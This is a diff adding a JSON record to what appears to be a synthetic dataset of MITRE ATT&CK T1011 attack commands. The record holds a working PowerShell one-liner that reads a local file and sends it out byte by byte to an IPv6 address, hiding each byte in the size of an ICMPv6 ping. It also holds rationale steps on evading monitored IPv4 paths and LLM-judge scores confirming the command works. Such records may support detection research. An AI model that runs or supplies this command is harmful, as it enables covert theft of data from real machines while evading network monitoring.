@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Sends a sync marker ICMPv6 echo, then exfiltrates bytes via payload size to a ULA, making use of an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Emit a distinct-size ICMPv6 echo as a synchronization preamble.",
+    "Stream file bytes by encoding them in -BufferSize with a known base.",
+    "Use IPv6 destinations to avoid common monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-bcd0af6a",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with correct quoting, variable assignments, pipelines, semicolons, and valid Test-Connection parameters and arithmetic.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly exfiltrates file bytes via ICMPv6 echo payload sizes, it does not ensure use of a different network medium as required by T1011 and aligns more with exfiltration over an alternative protocol (ICMP), making the technique claim only partially satisfied.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-09-30T23:45:04.375766Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses, valid variable assignments, proper piping, and correct method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements T1011 by reading a file and exfiltrating its contents byte-by-byte over IPv6 ICMP (a different network medium) by encoding each byte in the buffer size of ping packets, with a proper sync marker to initiate the transfer.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:45:10.044066Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid PowerShell syntax for variable assignment, cmdlets, parameters, .NET calls, and control flow, with balanced delimiters throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements the claimed ICMPv6 exfiltration by encoding data bytes into packet sizes (BufferSize) and targets Unique Local Addresses (ULA), which is a plausible and operationally realistic approach for exfiltrating data over an alternate network medium as described by T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:45:24.869821Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
